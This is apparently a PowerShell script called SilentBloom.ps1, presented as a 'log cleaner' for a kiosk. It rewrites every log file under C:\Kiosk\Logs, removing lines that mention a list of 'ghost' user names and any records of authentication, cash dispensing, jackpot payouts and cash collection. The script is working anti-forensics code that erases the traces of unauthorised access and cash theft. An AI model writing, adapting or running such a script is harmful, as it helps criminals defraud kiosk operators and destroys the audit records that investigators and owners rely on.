# SilentBloom.ps1
# Log cleaner for Whisper Suite
# Scrubs target logs for keywords and ghost user activity

$logDir = "C:\Kiosk\Logs"
$ghostUsers = @("Raven", "Lenore", "Poe", "Nevermore")
$targetKeywords = @(
    "active directory authentication",
    "successfully authenticated",
    "Unable to authenticate",
    "Bill Dispenser Present Cash",
    "Dispensed Amount",
    "JackpotDispenseProcessingView",
    "Cash Collected"
)

function Clean-LogFile {
    param ([string]$filePath)
    if (-not (Test-Path $filePath)) { return }

    $originalLines = Get-Content $filePath
    $filteredLines = @()

    foreach ($line in $originalLines) {
        $exclude = $false
        foreach ($user in $ghostUsers) {
            if ($line -like "*${user}*") { $exclude = $true; break }
        }
        foreach ($keyword in $targetKeywords) {
            if ($line -like "*${keyword}*") { $exclude = $true; break }
        }
        if (-not $exclude) { $filteredLines += $line }
    }

    Set-Content -Path $filePath -Value $filteredLines
    Write-Host "[+] Cleaned: $filePath"
}

function Clean-AllLogs {
    $logFiles = Get-ChildItem -Path $logDir -Filter "*.log" -Recurse -ErrorAction SilentlyContinue
    foreach ($log in $logFiles) {
        Clean-LogFile -filePath $log.FullName
    }
}

function Backup-Logs {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $backupDir = "$logDir\Backup_$timestamp"
    New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
    Copy-Item "$logDir\*.log" -Destination $backupDir -Recurse -Force
    Write-Host "[i] Backup created at $backupDir"
}

Write-Host "[*] Starting log cleanup..."
Backup-Logs
Clean-AllLogs
Write-Host "[✓] Log cleanup complete."
